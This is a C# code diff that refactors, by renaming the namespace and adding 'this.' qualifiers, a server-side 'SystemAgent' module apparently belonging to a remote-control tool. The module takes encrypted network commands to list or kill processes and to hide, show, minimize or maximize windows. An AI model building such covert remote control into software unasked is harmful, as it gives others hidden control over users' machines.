@@ -4,7 +4,7 @@ using System.Net.Sockets;
 using System.Threading;
 using bc.srv.Classes.Comunicator;
 
-namespace bc.srv.Muduli.System_Info
+namespace bc.srv.Modules.System_Info
 {
     internal class SystemAgent
     {
@@ -15,8 +15,8 @@ namespace bc.srv.Muduli.System_Info
 
         public SystemAgent(NetworkStream clientStream)
         {
-            systemStream = clientStream;
-            mm = new MsgManager(clientStream);
+            this.systemStream = clientStream;
+            this.mm = new MsgManager(clientStream);
         }
 
         /// <summary>
@@ -24,7 +24,7 @@ namespace bc.srv.Muduli.System_Info
         /// </summary>
         public void StartSystemListener()
         {
-            var t = new Thread(SystemListener);
+            var t = new Thread(this.SystemListener);
             t.IsBackground = true;
             t.Start();
         }
@@ -35,14 +35,14 @@ namespace bc.srv.Muduli.System_Info
         /// </summary>
         private void SystemListener()
         {
-            while (SrvData.Instance.isConnected && !stopSystemListener)
+            while (SrvData.Instance.isConnected && !this.stopSystemListener)
                 try
                 {
                     Thread.Sleep(10);
 
-                    var cmd = mm.WaitForEncryMessageRicorsive(10000);
+                    var cmd = this.mm.WaitForEncryMessageRicorsive(10000);
 
-                    if (stopSystemListener)
+                    if (this.stopSystemListener)
                         break;
 
                     if (cmd != "TIMEOUT" && cmd != "__ERROR__")
@@ -53,42 +53,42 @@ namespace bc.srv.Muduli.System_Info
                         {
                             case "LIST_PROCESSES":
                                 // INVIA LISTA DEI PROCESSI ATTIVI
-                                SendProcesses();
+                                this.SendProcesses();
                                 break;
 
                             case "KILL":
                                 // KILLO IL PROCESSO INDICATO ON CMDSPLIT1
-                                KillProcess(cmdSplit[1]);
+                                this.KillProcess(cmdSplit[1]);
                                 break;
 
                             case "EXIT":
                                 // ESCO DAL CICLO E VIENE UCCISO IL THREAD E LISTENER
-                                stopSystemListener = true;
+                                this.stopSystemListener = true;
                                 break;
 
                             case "LIST_WINDOWS":
                                 // INVIA LISTA DELLE finestre
-                                SendWindows();
+                                this.SendWindows();
                                 break;
 
                             case "MINIMIZE_WINDOW":
                                 // RICHIESTA Minimize FINESTRA CON HANDLE PASSATO IN CMDPAR1
-                                MinimizeWindow(cmdSplit[1]);
+                                this.MinimizeWindow(cmdSplit[1]);
                                 break;
 
                             case "MAXIMIZE_WINDOW":
                                 // RICHIESTA Maximize FINESTRA CON HANDLE PASSATO IN CMDPAR1
-                                MaximizeWindow(cmdSplit[1]);
+                                this.MaximizeWindow(cmdSplit[1]);
                                 break;
 
                             case "HIDE_WINDOW":
                                 // RICHIESTA Hide FINESTRA CON HANDLE PASSATO IN CMDPAR1
-                                HideWindow(cmdSplit[1]);
+                                this.HideWindow(cmdSplit[1]);
                                 break;
 
                             case "SHOW_WINDOW":
                                 // RICHIESTA Show FINESTRA CON HANDLE PASSATO IN CMDPAR1
-                                ShowWindow(cmdSplit[1]);
+                                this.ShowWindow(cmdSplit[1]);
                                 break;
                         }
                     }
@@ -99,13 +99,13 @@ namespace bc.srv.Muduli.System_Info
 
             // ARRIVO QUI PERCHè IL LISTENER è MORTO
 
-            if (SrvData.Instance.nsListaCanali.Contains(systemStream))
-                SrvData.Instance.nsListaCanali.Remove(systemStream);
+            if (SrvData.Instance.nsListaCanali.Contains(this.systemStream))
+                SrvData.Instance.nsListaCanali.Remove(this.systemStream);
 
 
             try
             {
-                systemStream.Close();
+                this.systemStream.Close();
             }
             catch
             {
@@ -162,7 +162,7 @@ namespace bc.srv.Muduli.System_Info
 
                 processListMessage = processListMessage.TrimEnd('*');
 
-                mm.SendLargeEncryMessage(processListMessage, 10000);
+                this.mm.SendLargeEncryMessage(processListMessage, 10000);
             }
             catch
             {
@@ -186,11 +186,11 @@ namespace bc.srv.Muduli.System_Info
                 if (p != null)
                     p.Kill();
 
-                mm.SendEncryMessage("KILLED!", 5000);
+                this.mm.SendEncryMessage("KILLED!", 5000);
             }
             catch
             {
-                mm.SendEncryMessage("NOT_KILLED!", 5000);
+                this.mm.SendEncryMessage("NOT_KILLED!", 5000);
             }
         }
         //--------------------------------
@@ -206,7 +206,7 @@ namespace bc.srv.Muduli.System_Info
                 var winList = wm.GetWindows();
 
                 if (winList != null)
-                    mm.SendLargeEncryMessage(winList, 10000);
+                    this.mm.SendLargeEncryMessage(winList, 10000);
             }
             catch
             {
@@ -229,13 +229,13 @@ namespace bc.srv.Muduli.System_Info
                 var minimize = wm.MinimizeWindow(iHandle);
 
                 if (minimize > 0)
-                    mm.SendEncryMessage("MINIZED", 5000);
+                    this.mm.SendEncryMessage("MINIZED", 5000);
                 else
-                    mm.SendEncryMessage("NOT_MINIMIZED", 5000);
+                    this.mm.SendEncryMessage("NOT_MINIMIZED", 5000);
             }
             catch
             {
-                mm.SendEncryMessage("NOT_CLOSED", 5000);
+                this.mm.SendEncryMessage("NOT_CLOSED", 5000);
             }
         }
 
@@ -254,13 +254,13 @@ namespace bc.srv.Muduli.System_Info
                 var minimize = wm.MaximizeWindow(iHandle);
 
                 if (minimize > 0)
-                    mm.SendEncryMessage("OK", 5000);
+                    this.mm.SendEncryMessage("OK", 5000);
                 else
-                    mm.SendEncryMessage("NOT", 5000);
+                    this.mm.SendEncryMessage("NOT", 5000);
             }
             catch
             {
-                mm.SendEncryMessage("ERROR", 5000);
+                this.mm.SendEncryMessage("ERROR", 5000);
             }
         }
 
@@ -279,13 +279,13 @@ namespace bc.srv.Muduli.System_Info
                 var h = wm.HideWindow(iHandle);
 
                 if (h > 0)
-                    mm.SendEncryMessage("OK", 5000);
+                    this.mm.SendEncryMessage("OK", 5000);
                 else
-                    mm.SendEncryMessage("NOT", 5000);
+                    this.mm.SendEncryMessage("NOT", 5000);
             }
             catch
             {
-                mm.SendEncryMessage("ERROR", 5000);
+                this.mm.SendEncryMessage("ERROR", 5000);
             }
         }
 
@@ -304,13 +304,13 @@ namespace bc.srv.Muduli.System_Info
                 var h = wm.ShowWindow(iHandle);
 
                 if (h > 0)
-                    mm.SendEncryMessage("OK", 5000);
+                    this.mm.SendEncryMessage("OK", 5000);
                 else
-                    mm.SendEncryMessage("NOT", 5000);
+                    this.mm.SendEncryMessage("NOT", 5000);
             }
             catch
             {
-                mm.SendEncryMessage("ERROR", 5000);
+                this.mm.SendEncryMessage("ERROR", 5000);
             }
         }
     }
